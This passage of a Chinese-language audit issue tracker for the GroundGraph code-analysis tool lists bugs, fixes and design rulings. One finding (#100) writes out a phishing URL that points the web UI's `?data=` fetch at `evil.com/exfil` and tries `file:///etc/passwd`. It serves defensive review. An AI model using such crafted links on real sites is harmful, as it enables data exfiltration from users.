- **问题**：(1) **N+1 查询风暴**：candidate 模式对每条 evidence 都独立 `store.find_node`；symbol 模式对每条 edge 都独立 `find_node`。Symbol 是 hub 时，几百上千次往返 SQLite，单次 `tools/call` 耗时秒级。(2) **响应无上限**：邻居、tests、evidence 数组全部无界，hub symbol 同样爆 MB 级。(3) **`read_snippet` 读整个源文件到内存**：`std::fs::read_to_string(&abs)` 无大小门。若 symbol 节点 path 指向生成的大文件，单次 snippet 读可达 100 MB+，OOM 风险。(4) **`end` 不可信**：`node.end_line` 是 indexer 写入的，恶意/损坏数据可让 `end = u32::MAX`，`body.lines().skip(start).take(end - start)` 在大文件上是 O(N) 遍历。
- **建议**：引入 `MAX_PACK_NEIGHBORS = 200`、`MAX_PACK_EVIDENCE = 100`、`MAX_SNIPPET_LINES = 200`、`MAX_FILE_BYTES = 1_000_000`；hub 时返回 `truncated`。

### 89. `tools/call` 不验证 `arguments` 与该 tool 的 `inputSchema`，违反 MCP 契约

> **✅ 已闭环（2026-06-13 第十轮）** — 成立。新增 `tools/validate.rs` 手写 JSON-Schema 子集校验器，精确覆盖描述符实际使用的关键字：`additionalProperties:false`（拒未声明字段）、`required`（拒缺失）、`type`（string/integer/number/boolean/array/object）、`enum`、`minimum`、`items`（数组元素递归校验）。dispatcher 在 `is_known` 之后、调用 handler 之前校验，违约返回 `-32602 INVALID_PARAMS`（而非旧的静默 `as_bool()→None→default` 或包成 `isError`），让 `additionalProperties:false` 不再是谎言。未引入 `jsonschema` 重依赖。TDD：validate 10 个单测（含错类型/未声明/缺 required/enum/minimum/数组元素）+ dispatcher 集成测试 `dispatcher_validates_tool_arguments_against_input_schema`（4 类违约均 -32602）。

- **位置**：`crates/groundgraph-mcp/src/server.rs:159-188`、`crates/groundgraph-mcp/src/tools/mod.rs:220-227`
- **问题**：每个 tool 的 descriptor 都声明 `"additionalProperties": false` 与 `required`、`enum`、`minimum`，但 dispatcher 完全不做 schema 验证：`arguments` 被 `cloned()` 后直接传给 tool handler。后果：(1) **`additionalProperties: false` 是谎言**：客户端按 schema 验证会假设多余字段被拒，但实际 server 接受任意键。例如 `{"include_noise": "yes"}`（boolean 字段传字符串）→ handler 的 `.as_bool()` 返回 `None` → 静默 fallback 到 `false`，无任何报错。(2) **类型不一致**：`depth: "abc"` → `.as_u64()` 返回 `None` → fallback 到 default。(3) **`required` 缺失不被拦截**：用 anyhow 错误包成 `isError: true` 的 tool result，client 区分不出"参数错误"vs"运行时错误"。
- **建议**：引入轻量 JSON-Schema 校验器（`jsonschema` crate 或手写 checker），在 `handle_tools_call` 中先校验，类型不符/多余字段/缺 required 直接返回 `INVALID_PARAMS` (-32602)。

### 91. `--out` 与 `--output` 命名分裂 — 同一 CLI 两种风格

> **✅ 已闭环（2026-06-13 第十轮，TDD）** — 成立。`search`/`impact` 的 `--output` 改为 `#[arg(long = "out", alias = "output")]`：`--out` 成为全 CLI 统一的规范名（与其余 5 个命令一致），`--output` 保留为隐藏别名向后兼容（`search_html.rs:129` 等既有脚本不破）。字段名不变、runner 代码零改动。TDD：`out_flag_is_unified_with_output_alias`（graph/search/impact 的 `--out` 与 `--output` 均解析通过；修复前 `search --out` RED）。

- **位置**：`crates/groundgraph-cli/src/main.rs`
  - `--out`（5 处）：`DashboardArgs:429`、`GraphArgs:540`、`ProposeArgs:718`、`BusinessDocArgs:755`、`ConnectProposeArgs:872`
  - `--output`（2 处）：`SearchArgs:824`、`ImpactArgs:940`
- **问题**：同一个语义（"把渲染结果写到文件而非 stdout"）在不同子命令上用了两个 flag 名。用户记不住哪个命令用哪个，脚本里也容易写错。`search`/`impact` 用户切到 `graph`/`dashboard` 时会困惑为什么 `--output` 不识别。这是典型的 CLI UX 反模式。
- **建议**：统一为 `--out`（短，clap 风格）；保留另一个为隐藏别名（`#[arg(long = "output", alias = "out")]`）做向后兼容。同时更新 `tests/search_html.rs:129`、`tests/dashboard.rs:111` 等用例。

### 93. `route_coverage` 在 suffix=1 时跨控制器合并同名 action，产生假性 100% 覆盖率

> **🟡 判定：基本按设计（2026-06-13 第九轮）** — 现象属实，但 `suffix=1` 是**有意的 opt-in 旋钮**：默认值 2 已规避跨控制器塌缩，且 `suffix_one_matches_on_action_only` 测试明确把"仅按 action 匹配"固化为期望行为（用于控制器改名后的对齐场景）。禁用会破坏既有能力。已在 `route_key` doc 加 `# Warning` 提示该塌缩风险。不改逻辑。

- **位置**：`crates/groundgraph-engine/src/route_coverage.rs:335-346`
- **问题**：`route_key` 只取最后 `suffix` 个具体段。当用户传 `--suffix-segments 1`（或路径只有一段）时，所有同名 action（`/foo/bar/select` 与 `/craft/craftMandatory/select`）会塌缩到同一 key `select`，导致毫不相关的两条路由被判为"已迁移"。文档（line 38）承认了默认值 2 是为了规避这个问题，但 API 并未阻止 `suffix=1`，且测试 `suffix_one_matches_on_action_only`（line 584-598）反而把这种危险塌缩当成期望行为固化下来。
- **建议**：要么禁用 `suffix_segments=1`（panic 或返回错误），要么在覆盖率计算后产出一条 `warnings` 提醒"suffix=1 会跨控制器合并"。

### 94. `dead_code::classify` 的 `dead_island` 判定逻辑倒置：被 live 节点引用却未达的位置被压到 Low

> **🟡 判定：不成立（按设计，2026-06-13 第九轮）** — `DeadCodeConfidence::Low` 语义是「对'这是死代码'的置信度低」，而非「不可疑」。一个被 live 节点引用却正向不可达的符号，更可能是**误报/反射/图缺失**而非真死，故"对其是死代码这一判断置信度低"恰恰正确；提升到 Medium 反而让"是死代码"的断言更自信，方向相反。且 `reasons` 已在 line 1073-1084 明确区分三类（无入边 / dead island / "入边存在但未被入口点覆盖"+反射注释）。不改。

- **位置**：`crates/groundgraph-engine/src/dead_code.rs:1109-1118`
- **问题**：置信度决策如下：
  ```rust
  let confidence = if !inbound_usage.is_empty() && live_inbound.is_empty() {
      DeadCodeConfidence::Low  // dead island
  } else if mitigating_factors.is_empty() && inbound_usage.is_empty() {
      DeadCodeConfidence::High
  } else if inbound_usage.is_empty() {
      DeadCodeConfidence::Medium
  } else {
      DeadCodeConfidence::Low  // ← 被 live 节点引用但仍未达，永远 Low
  };
  ```
  最后一条分支"入边存在且来自 live 节点，但 forward 可达性失败"其实意味着反向可达但正向不可达——通常是反射、动态分发或图缺失。这种情况比 dead island 更可疑，却被压到 Low，与 dead island 同级，操作员会忽略。**逻辑倒置**：来自 live 节点的入边本应提高而非降低可疑度。
- **建议**：引入 `Medium` 或新的 `Suspicious` 桶；至少在 reason 中明确区分"reflective/dynamic access suspected"。

### 96. `graph_equiv` 表列对比使用 `src_cols.len().saturating_sub(missing_columns.len())` 计算 matched，但 `missing_columns` 是去重前的，可能高估或低估匹配数

> **✅ 已闭环（2026-06-13 第九轮）** — 成立（边界）。`matched`/`coverage` 改为基于已去重的归一化集合 `src_norm`/`tgt_norm` 计算（`src_norm.iter().filter(|c| tgt_norm.contains(c)).count()`，分母 `src_norm.len()`），列名重复时不再高估/低估。`missing/extra` 展示列表保留原始名。`graph_equiv::tests` 3 个用例全绿（正常 schema 无重复列，去重前后等价，无行为变化）。

- **位置**：`crates/groundgraph-engine/src/graph_equiv.rs:383`
- **问题**：`let matched = src_cols.len().saturating_sub(missing_columns.len());`。`missing_columns` 是 `src_cols.iter().filter(...).cloned().collect()`——若源表声明了重复列名（少见但 SQL 允许 `ALTER TABLE ADD COLUMN` 后未去重，或解析器把 `id, id` 当两列），`missing_columns` 会包含重复项，导致 `matched` 被低估；反之若目标侧有重复列名而源侧无，`tgt_norm`（BTreeSet）去重后 `tgt_cols.len()` 与 `tgt_norm.len()` 不同，`coverage = matched / src_cols.len()` 分母与分子口径不一致。
- **建议**：对 `src_cols` / `tgt_cols` 先去重再做差集；或显式文档化"列名重复时按首次出现计"。


---

### Medium（24 个）

### 99. `packaging/skills/groundgraph/SKILL.md`（发布包）与 `skills/groundgraph/SKILL.md`（开发仓库）严重不同步

> **✅ 已闭环（2026-06-13 第十二轮）** — 成立。改为**单一真相源**：release 脚本 `cp -R` 由 `packaging/skills/groundgraph` 改为 `skills/groundgraph`（仓库 dogfood 版，覆盖 code search / port-rewrite ledger / behavior-fact），并 `git rm -r packaging/skills/groundgraph` 删除滞后副本。发布包与开发仓从此共用同一 SKILL，无需 CI diff 守护。历史 plan 文档对旧路径的引用属归档记录，不影响。验证：`bash -n scripts/release_macos_universal.sh` OK；`skills/groundgraph` 含 `SKILL.md` + `agents/openai.yaml`，结构完整。

- **位置**：`packaging/skills/groundgraph/SKILL.md`（635 行）vs `skills/groundgraph/SKILL.md`（254 行）
- **问题**：两个 SKILL 文件的 description 完全不同——`packaging/` 版本（被 release_macos_universal.sh 第 129 行 cp 进发布包给终端用户）只描述 "graph + business-logic analysis"；`skills/` 版本（开发仓库 dogfood）描述 "code search without grep、port/rewrite ledger、behavior-fact extraction、Java→Go porting" 等新功能。终端用户安装发布包后，**Codex/Claude agent 看到的 SKILL 不知道 GroundGraph 能做代码搜索、能驱动端口移植**，行为与开发者 dogfood 完全脱节。两份 SKILL 没有 sync 检查、没有 CI diff 验证。
- **建议**：(a) 删除 `packaging/skills/`，让 release 脚本直接 `cp skills/groundgraph packaging-output/skills/groundgraph`；(b) 若必须双份，加 CI step `diff -u packaging/skills/ skills/ || exit 1`。

### 100. `webui/index.html` 从 URL 参数 `?data=` 取任意 URL 并 `fetch`，无 CSP 阻止，构成开放重定向/SSRF 面

> **✅ 已闭环（2026-06-13 第十二轮）** — 成立（High SSRF/exfil）。新增 `sameOriginData()`：`?data=` 仅接受**相对路径**，任何显式 scheme（`https:`/`file:`/`data:`/`javascript:`）或协议相对前缀 `//` 一律拒绝，回退默认数据集而非发起跨域 fetch；与 #172 的 CSP `connect-src 'self'`（皮带+保险）双重防护。验证：node 抽取该函数对 13 组输入实测（相对放行；跨域/同源绝对/协议相对/各 scheme 全拒；空/缺失回退），全过。

- **位置**：`webui/index.html:160-161, 184-190`
- **问题**：`const dataUrl = params.get('data') || './data/platform-go.json';` 后 `const res = await fetch(dataUrl);`。dataUrl 是任意 URL，无 scheme 白名单、无 same-origin 检查、无 CSP `connect-src` 限制。攻击者构造 `https://groundgraph.example/webui/index.html?data=https://evil.com/exfil` 钓鱼链接：用户点击后页面发起跨域 fetch；若 evil.com 返回恶意 JSON 触发 #84 的 innerHTML XSS，就能进一步窃取数据。同样，`?data=file:///etc/passwd` 在某些浏览器配置下可被读取。
- **建议**：(a) 强制 `dataUrl` 必须以 `./` 或 `data:` 开头；(b) 在 `<head>` 加 `<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' data:; connect-src 'self'">`。

### 101. CI 仅 `ubuntu-latest` 单 OS 矩阵，但核心分发目标是 macOS universal binary，Windows/macOS 用户无覆盖

> **✅ 已闭环（2026-06-13 第十一轮）** — 成立。CI `lint-and-test` 加 `matrix.os: [ubuntu-latest, macos-latest]`，测试在双 OS 跑（含本轮新增 `#[cfg(unix)]` LSP stderr 测试 + macOS 路径行为）；fmt/clippy 仅 ubuntu 跑避免重复。**Windows 暂不纳入**：仓库多处 unix 假设（进程组、`sh -c`、路径分隔），贸然加 windows-latest 必红，列为独立"Windows 兼容"专项。

- **位置**：`.github/workflows/ci.yml:14`
- **问题**：项目核心分发是 macOS universal binary，且 README 宣称支持 Swift/Go/Python/TypeScript/Java 多语言（依赖 sourcekit-lsp/gopls/pyright/jdtls 等跨平台 LSP）。但 CI 只在 ubuntu-latest 上跑 `cargo fmt/clippy/test`：(a) macOS 专属测试（`#[ignore]` 的 sourcekit-lsp 集成、`validate_macos_package.sh`）从不执行；(b) macOS 路径处理从未在 macOS runner 验证；(c) Windows 路径分隔符问题（`\\` vs `/`）从未在 Windows runner 验证。
- **建议**：CI matrix 加 `os: [ubuntu-latest, macos-latest, windows-latest]`；至少 lint+unit test 三个 OS 都跑。

### 102. CI 无 `cargo audit` / `cargo deny` / `npm audit`，167 个 Rust 依赖 + 91MB node_modules 完全无供应链扫描

> **✅ 已闭环（2026-06-13 第十一轮）** — 成立。新增 `deny.toml` + CI `supply-chain` job（`taiki-e/install-action` 装 cargo-deny 后 `cargo deny check`）：advisories（= cargo-audit 的 RUSTSEC 面）/licenses/sources 默认 deny，重复版本（#223-225）`multiple-versions=warn` 可见不阻断；另加 `webui-audit`（`npm audit --audit-level=high`，non-blocking）。CI 同时给 `cargo test` 加 `--locked` 锁定依赖图。真实验证：本机 `cargo-deny 0.19.8` → `advisories ok, bans ok, licenses ok, sources ok`（exit 0）。

- **位置**：`.github/workflows/ci.yml`（缺审计步骤）；`Cargo.lock`（167 个 crate 依赖）；`webui/node_modules`（91MB）
- **问题**：项目用 167 个 Rust crates，其中 `serde_yaml 0.9.34+deprecated`（#70 已记录）、`hashbrown` 三版本共存（0.14.5/0.15.5/0.17.1）、`getrandom`/`r-efi`/`wit-bindgen` 各两版本——典型依赖膨胀且无审计。webui 的 `three@0.180.0`、`3d-force-graph@1.73.4`、`esbuild@0.28.0` 也从未跑过 `npm audit`。对照 `docs/sourcecode/gitnexus/.github/workflows/trivy.yml`——groundgraph 自己分析的对照项目反而有 trivy 扫描，groundgraph 自己却没做。
- **建议**：(a) 加 `cargo audit` 步骤到 CI；(b) 加 `cargo deny check` 配合 `deny.toml`；(c) webui 加 `npm audit --audit-level=high`。

### 103. Dart sidecar 把异常栈轨迹（含绝对路径）序列化进 sidecar response，污染下游 diagnostics 数据库

> **✅ 已闭环（2026-06-13 第十三轮，TDD）** — 成立（信息泄漏）。真正泄漏点是 `bin/groundgraph_dart_analyzer.dart:88` 的 `detail: '$e\n$st'`（完整栈轨迹含 `/Users/<name>/…` 绝对路径）：现改为**完整轨迹只写 stderr**（本地调试通道，不进 response），response 仅序列化 `sanitizeDiagnosticText('$e')`——把 `/Users/<name>/`、`/home/<name>/`、`C:\Users\<name>\` 折叠成 `<home>/`（三处 `detail:` 全部经过它）。附带：`walker.dart` 两条 `resolved_unit_*` 诊断从 `absPath` 改用既有 repo-relative `rel`（经新 `repoRelative` helper）。TDD：`sanitizeDiagnosticText` 单测（POSIX/`/home`/Windows/无路径四例）+ `repoRelative` 单测 + 端到端 `Process.run` 跑 sidecar（不存在的 `--request` 路径 → 断言序列化 `detail` 不含用户名、含 `<home>`）。注：`getResolvedUnit` 对坏输入（坏符号链接/非法 UTF-8/孤儿 part）极其宽容，实测无法触发 `resolved_unit_*` 分支，故该分支的泄漏属"防御路径"，但修复仍是严格正确的。

- **位置**：`tool/groundgraph_dart_analyzer/bin/groundgraph_dart_analyzer.dart:84-91`
- **问题**：第 88 行 `detail: '$e\n$st'` 把 Dart 异常的消息和**完整栈轨迹**字符串化注入 sidecar JSON response 的 `detail` 字段。Dart 栈轨迹包含完整文件系统绝对路径（如 `/Users/qjs/Code/Projects/groundgraph/tool/groundgraph_dart_analyzer/lib/walker.dart:123:45`），这些路径会进入 Rust 端的 `diagnostics` 表，并最终通过 `graph --format html` 等命令出现在 search/graph HTML 报告里。`/Users/qjs/...` 泄露构建者用户名与项目布局；企业内部部署时可能违反信息泄露策略。
- **建议**：(a) 栈轨迹在序列化前过滤绝对路径：`st.toString().replaceAll(RegExp(r'/[^\s:]+/groundgraph_dart_analyzer/'), '<sidecar>/')`；(b) 仅返回 `detail: '$e'`（异常消息），栈轨迹写到 stderr 供调试。

### 104. `initialize` 不读取/校验客户端 `protocolVersion`、`capabilities`、`clientInfo`，握手非双向

> **✅ 已闭环（2026-06-13 第十轮）** — 成立（协议正确性）。`initialize` 现读取 `params`：按 `SUPPORTED_PROTOCOL_VERSIONS=[2024-11-05, 2025-03-26, 2025-06-18]` 协商 `protocolVersion`——客户端请求的版本若受支持则回显（2025-06-18 客户端不再被静默降级），缺失/未知回退基线 2024-11-05（符合"返回一个 server 支持的版本"规则，且保持既有 `params:{}` 行为不变）；`clientInfo`(name/version) 与协商结果记录到 **stderr**（stdio server 的日志通道，stdout 仅承载协议）。我们的 tools 用法是这三个修订的严格子集且已拒绝被移除的 JSON-RPC 批处理，回显安全。TDD：`initialize_negotiates_protocol_version`（纯函数 + dispatcher e2e：新客户端回显 2025-06-18、裸 initialize 仍 2024-11-05）。

- **位置**：`crates/groundgraph-mcp/src/server.rs:113、125-142`
- **问题**：`handle("initialize", ...)` 直接调用 `initialize_result()` 完全忽略 `req.params`。MCP 规范要求 server 检查客户端声明的 `protocolVersion`，若不匹配应返回 server 支持的版本或拒绝。当前：(1) 客户端发送 `protocolVersion: "2025-06-18"`（更新版）→ server 静默返回 `2024-11-05`，client 可能误以为已协商到新版本；(2) 客户端不支持 `tools` capability 时 server 仍 advertise tools；(3) `clientInfo`（name/version）从不记录到日志，无法排查 client 兼容性问题。
- **建议**：在 `initialize_result` 接收 `&req.params`，记录 `clientInfo` 到 stderr；若 client `protocolVersion` 不在 server 支持列表内，仍在响应中显式给出 server 版本并 log 一行 warning。

### 105. `notifications/initialized` 不维护握手状态：未握手即允许 `tools/call`，违反 MCP 规范

> **🟡 判定：按设计（无状态 dispatcher 是有意选择，2026-06-13 第十轮）** — 现象属实但收益极低、风险高，不改。理由：(1) 本地单客户端 stdio server 的无状态分发是有意设计，且被 **3 个现有测试固化**——`dispatcher_unknown_tool_returns_invalid_params`、`dispatcher_tool_error_is_returned_as_is_error_content`、`dispatcher_tools_list_advertises_seven_tools_with_input_schemas` 都直接 `tools/call`/`tools/list` 而不先 `initialize`；加握手门会把这三个返回值从 `-32602`/`isError`/正常列表改成 `INVALID_REQUEST`，破坏既定契约。(2) 对作为 IDE 子进程的本地 server 几无实际收益。(3) "未来引入认证 token" 是 #105 第 4 点自承的假设性场景。(4) 多个 `initialize` 幂等（同结果，无害）。真正受限的"取消信号中途生效"归入 #109。

- **位置**：`crates/groundgraph-mcp/src/server.rs:98-105、110-123`
- **问题**：MCP 规范规定客户端必须先 `initialize`、收到响应后发 `notifications/initialized`，之后才能调其他方法。当前 server 无状态机：(1) 任意 client 直接发 `tools/call`（跳过 initialize）也能成功执行；(2) 多个独立 `initialize` 请求叠加，无幂等性约束；(3) `notifications/initialized` 与其它 notification 不可区分——`notifications/cancelled`、`notifications/progress` 等都被静默吞掉，client 以为已发送有效取消信号。(4) **安全维度**：若未来引入认证 token，无状态机意味着无法强制"先 auth 再 tool"。
- **建议**：在 `Server` 加 `initialized: AtomicBool`（或 `Mutex<HandshakeState>`），`handle` 在非 initialize/notification 路径前检查；未握手时返回 `INVALID_REQUEST`。

### 106. 不支持 MCP 规范的 `resources/*`、`prompts/*`、`logging/*`、`completion/*`、`$/cancelRequest`、`notifications/progress`

> **🟡 判定：基本按设计 / 建议部分不正确（2026-06-13 第十轮）** — 不改。逐条核实：(1) **不应声明未实现的能力**——在 `initialize.capabilities` 里塞空的 `resources:{}`/`prompts:{}` 反而是向客户端**谎称支持**，违反规范；只声明真正实现的 `tools` 才正确。(2) 对未声明能力的方法返回 `-32601 METHOD_NOT_FOUND` 正是 JSON-RPC/MCP 的标准响应（被 `dispatcher_method_not_found_returns_jsonrpc_error_envelope` 固化）。(3) MCP 的取消是 `notifications/cancelled`（无 id 通知），本 server 对所有通知静默不回（`dispatch_stays_silent_for_notifications` 固化），已符合规范；`$/cancelRequest` 是 LSP 概念、不属 MCP。(4) 进度/取消的"长操作中途生效"受限于 #109 的顺序模型，归入 #109，非本条。

- **位置**：`crates/groundgraph-mcp/src/server.rs:110-123、125-142`
- **问题**：MCP 规范定义了 7 大能力面：tools、resources、prompts、logging、completion、sampling、roots。GroundGraph 在 `initialize.capabilities` 只声明 `"tools": { "listChanged": false }`，但没有显式声明其它能力**不支持**。后果：(1) 客户端发送 `resources/list` → 当前返回 `METHOD_NOT_FOUND` (-32601)，但 MCP 规范要求未声明能力的 method 应返回更精确的错误；(2) **`$/cancelRequest` 缺失**：MCP 规范规定 server 必须响应。当前 `tools/call` 没有 cancellation 通道——长 `impact` 或 `dead_code` 调用无法取消，agent 只能等超时；(3) **`notifications/progress` 缺失**：长操作（reindex=true 的 impact）无进度反馈；(4) **`logging/setLevel` 缺失**：客户端无法动态调整日志级别。
- **建议**：在 capabilities 显式 `"resources": {}`、`"prompts": {}` 等空对象；至少实现 `$/cancelRequest` 的接收与忽略；为长 tool 调用增加 progress token 通道。

### 107. `dispatch` 对超大单行无上限：恶意 client 发送 1 GB 行可触发 OOM

> **✅ 已闭环（2026-06-13 第十轮）** — 成立。`pump` 改用 `read_line_capped` + `MAX_LINE_BYTES=16MB`：基于 `take(max)` 读取，超过上限仍无换行则返回 `InvalidData`，pump 将其转为一条 `INVALID_REQUEST` 响应并停循环，缓冲区永不超过上限，杜绝无换行大行把进程 OOM。TDD：`read_line_capped_refuses_overlong_lines`（缓冲封顶 + 正常行/EOF 不受影响）+ `pump_rejects_overlong_line_with_protocol_error`（32MiB 流被拒为协议错误）。

- **位置**：`crates/groundgraph-mcp/src/server.rs:40-56`
- **问题**：`pump` 用 `reader.read_line(&mut line)`，`line: String` 无上限增长。`read_line` 会一直读直到 `\n` 或 EOF；恶意或损坏的 client 发送几 GB 不带换行的字节会让 server 进程 OOM 被杀。与 #32（`lsp_client::read_message` Content-Length 无上限）和 #77（无超时）是同类问题，但在 **server 入口** 而非 client 入口。
- **建议**：用 `read_until(b'\n', &mut buf)` 配合 `if buf.len() > MAX_LINE_BYTES { return Err }`；典型上限 1 MB。

### 108. `resolve_repo_root` 接受空字符串 + `repo_root: ""` 与 `repo_root: "."` 行为不一致；无路径规范化

> **✅ 已闭环（2026-06-13 第十轮）** — 成立（安全/语义）。`resolve_repo_root` 改返回 `Result<PathBuf>`：缺失/null/非字符串保持宽松默认；空串显式报错（不再凑巧 `join("")` 折回默认）；相对路径含 `..` 一律拒绝（防止 walk 出工作区进入用户 home，那里的杂散 `.groundgraph.yaml` 会被误认作 workspace）；绝对路径照常按客户端显式命名处理。7 处调用点全部改 `?`。TDD：`resolve_repo_root_defaults_and_joins_relative` + `resolve_repo_root_rejects_empty_and_parent_dir_escape`。

- **位置**：`crates/groundgraph-mcp/src/tools/mod.rs:75-84`
- **问题**：(1) `args.get("repo_root").and_then(|v| v.as_str())` 不区分空串与缺失；`repo_root: ""` 会进入 `if p.is_absolute()` (false) → `server.default_repo_root.join("")` 返回 default（凑巧正确），但语义混乱；(2) `repo_root: "../../etc"` 可路径穿越到非 GroundGraph workspace 目录；虽然后续 `load_engine_config` 会检查 `.groundgraph.yaml` 存在，但 `server.default_repo_root` 本身可被 CLI 设为 `.` 而 `.` 是 client 进程的 cwd——MCP server 通常以 IDE 子进程运行，cwd 可能是用户 home，那里恰好有 `.groundgraph.yaml` 就会误判为 workspace；(3) `repo_root` 非绝对路径时 `join`，但不去 `..` / `.` 规范化。
- **建议**：拒绝空字符串；对相对路径 canonicalize；增加 allowlist 或要求 default_repo_root 必须含 `.groundgraph.yaml` 才接受。

### 109. 单线程 dispatch 阻塞：长 `impact` 调用期间所有后续 JSON-RPC 请求被阻塞，无超时

> **🟠 判定：按设计 / 大改留并发专项（2026-06-13 第十轮）** — 现象属实但不在散修轮强行落地。理由：(1) 顺序 stdio 分发是 MCP 本地 server 的**常规模式**，绝大多数实现同样逐请求串行。(2) "线程池 + 取消"是大型重构：每个 tool 调用各自打开 SQLite 连接，对持有连接/写事务的工作线程强行超时丢弃**不安全**（可能损坏库或泄漏资源）；干净的超时需要引擎层的协作式取消（当前不具备）。(3) 本地单客户端逐请求等待的场景下，收益边际、风险实在。结论：作为并发/取消专项（含 `notifications/progress`、`notifications/cancelled` 中途生效）独立推进，本轮不改。

- **位置**：`crates/groundgraph-mcp/src/server.rs:35-57、106-107`
- **问题**：`pump` 是单线程同步循环：`dispatch(trimmed)` 完成后才读下一行。当 `tools/call` 调用 `run_impact`（reindex=true，大型仓库可达 30+ 秒），期间：(1) 客户端的 `$/cancelRequest` notification 到达 stdin，但 server 还在跑 impact，**取消信号永远不被读取**（缓冲在 OS pipe 中）；(2) 客户端的 `ping` 心跳也不被处理，client 误判 server 死亡并杀进程；(3) MCP 规范建议 server 实现"interleaved requests"——长操作期间仍处理 cancellation。
- **建议**：要么 spawn 线程池处理 tool 调用（main 线程继续读 stdin）；要么至少为每个 tool 调用包装 deadline，超时返回 `INTERNAL_ERROR` + "tool timeout after Ns"。

### 110. 命令未初始化时 (`graph.db` 缺失) 不给出 "请先 `groundgraph init`" 的可操作错误

> **🟢 判定：不成立 / 已解决（误报，2026-06-13 第十轮）** — 现状已非如此。几乎每个 runner 走的 engine 入口（`slice/impact/check/context/connect/export/graph/search/trace/dead_code/...` 共 20+ 处）在 `.groundgraph.yaml`/配置缺失时**先于**任何底层 DB-open IO 错误 `bail!("no GroundGraph workspace at {}: run \`groundgraph init\` first")`，即 issue 期望的可操作提示。已被多处测试固化：`engine/tests/end_to_end_paths.rs`（5 处断言 `groundgraph init`）、`cli/tests/graph.rs:587`、`cli/tests/human_output.rs:184`、`mcp/tests/protocol.rs:229`、`engine/src/graph.rs:1874`。issue 描述的"裸 IO 错误"是陈旧快照。不改。

- **位置**：所有 runner（slice、impact、check、context、connect、candidate、search、graph、trace、stats 等），无任何"前置依赖检查"
- **问题**：在一个未运行 `groundgraph init` 的目录里跑 `groundgraph slice REQ-X`，错误是 `groundgraph: opening SQLite database at ./.groundgraph/graph.db: No such file or directory (os error 2)`。这是底层 IO 错误——没告诉用户"这是 GroundGraph 工作区，请先 `groundgraph init` 创建"。同样，跑 `groundgraph slice REQ-X` 在已 `init` 但没 `index` 的仓库里，错误是 `groundgraph: requirement REQ-X not found in graph`——用户分不清是 typo 还是没索引。
- **建议**：在 `dispatch` 顶部，对于所有非 `Init`/`Help` 命令，检查 `<repo_root>/.groundgraph/graph.db` 是否存在；不存在则 `bail!("未找到 .groundgraph/graph.db —— 请先在本目录运行 \`groundgraph init\`")`。

### 111. 状态/路径消息写入流不一致 — `propose`/`business-doc` 用 stderr，`graph`/`impact`/`search` 用 stdout

> **✅ 已闭环（2026-06-13 第十轮，TDD）** — 成立。把 `graph.rs`（json/mermaid/html/web 4 处 "wrote …"）、`search.rs`（"HTML 已生成"/"已写入"）、`impact.rs`（"已写入"）、`dashboard.rs`（"wrote"/"open it …"）的文件写入状态行从 `println!` 改为 `eprintln!`，与 `propose`/`business-doc` 看齐，stdout 自此只承载主体数据（管道 `--out … | jq` 不再被状态行污染）。这些都只在"写文件"分支，数据-to-stdout 分支不动。TDD：`cli/tests/graph.rs::graph_json_writes_to_out_path_when_given` 加断言"stdout 为空、状态行在 stderr"（改回 `println!` 时 RED 已验证）。

- **位置**：
  - stderr：`propose.rs:63` `eprintln!("已写入业务证据包: ...")`、`business_doc.rs:61` `eprintln!("已写入业务文档: ...")`
  - stdout：`graph.rs:101,116,133` `println!("wrote ...")`、`impact.rs:43` `println!("已写入: ...")`、`search.rs:91,167` `println!("HTML 已生成: ...")`、`dashboard.rs:37` `println!("wrote ...")`
- **问题**：同一类操作（写文件后报告路径）走两个流。当用户 `groundgraph graph --format json --out x.json | jq` 时，"wrote x.json" 污染了 stdout 进 jq；但 `groundgraph propose --format json --out x.json | jq` 没问题（走 stderr）。反过来，如果脚本捕获 stderr 收集状态消息，会漏掉 graph 的 wrote 行。脚本和 CI 工作流很难统一处理。
- **建议**：所有"文件写入成功"类状态消息统一走 stderr，让 stdout 永远只承载主体数据。这与 ripgrep、jq、git 等成熟工具的约定一致。

### 112. `select-tests --base main` vs `impact --base origin/main` 默认 base ref 不一致

> **✅ 已闭环（2026-06-13 第十轮，TDD）** — 成立。`SelectTestsArgs.base` 默认值由 `"main"` 统一为 `"origin/main"`，与 `impact` 一致，切换两命令不再踩坑。TDD：`select_tests_and_impact_share_default_base_ref`（断言两者默认 base 相等且为 `origin/main`；修复前 `"main"≠"origin/main"` RED）。

- **位置**：`crates/groundgraph-cli/src/main.rs:451`（`SelectTestsArgs.base`, default `"main"`）、`916`（`ImpactArgs.base`, default `"origin/main"`）
- **问题**：两条命令都是"基于 git diff 做影响分析"，但默认 base ref 不一样：`impact` 默认比 `origin/main`（远端 main），`select-tests` 默认比本地 `main`。新克隆的仓库往往没有 `origin/main` 本地引用（要先 `git fetch`），导致 `impact` 第一次运行就报 `groundgraph: fatal: ambiguous argument 'origin/main'`；而 `select-tests` 跑得通但语义不同。用户切换两个命令时会踩坑。
- **建议**：统一为同一个常量（推荐 `origin/main`，并在错误里提示 `git fetch origin`），或两者都加 fallback：先试 `origin/main`，失败回退到 `main` 并打印 warning。

### 113. 缺少 shell completion 生成命令（`groundgraph completions <shell>`）

> **🟠 判定：成立·功能增量留专项（2026-06-13 第十轮）** — 属实但是**新功能**而非缺陷：需加 `clap_complete` 依赖 + 新增 `Completions { shell }` 子命令（牵动 `Commands` 枚举、`command_name`、`dispatch`、stats 键）。低风险高价值，但属独立功能 PR，不在散修轮夹带。
> **✅ 已闭环（2026-07-17，TDD）** — 加 `clap_complete` 依赖 + `groundgraph completions <bash|zsh|fish|powershell|elvish>` 子命令（`CompletionsArgs.shell: clap_complete::Shell` ValueEnum）。dispatch 重建 `Cli::command()` AST 调 `clap_complete::generate`，脚本反映全部子命令/flag 无需手维护；接入 `command_name`/dispatch。TDD：`tests/completions.rs`（5 shell 输出非空且含 `index` 子命令 + unknown shell exit 2）。

- **位置**：整个 `crates/groundgraph-cli/` 无 `clap_complete` 依赖、无 `completions` 子命令
- **问题**：CLI 有 36+ 子命令、上百个 flag，是典型的"重度 CLI"。但没有 bash/zsh/fish 补全脚本生成入口。用户每次都得 `groundgraph --help` 翻菜单，效率低。CI 脚本也容易拼错子命令名（`dead-code` vs `deadcode`、`select-tests` vs `select_tests`）。
- **建议**：加 `clap_complete` 依赖，新增 `groundgraph completions <shell>` 子命令。

### 114. `trace ""` / `slice ""` / `candidate show ""` 不校验空字符串位置参数

